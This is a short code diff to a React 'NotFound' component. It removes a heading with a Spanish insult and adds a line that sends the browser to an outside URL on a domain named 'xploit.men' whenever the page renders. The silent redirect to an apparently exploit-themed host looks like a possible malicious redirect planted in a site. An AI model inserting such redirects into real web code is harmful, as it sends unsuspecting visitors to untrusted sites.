@@ -1,5 +1,3 @@
 export function NotFound() {
-    return (
-        <h1>Eres mas tonto que una zapatilla.</h1>
-    );
+    window.location.href="https://xploit.men/aira/error.php?error=e0x02"
 }
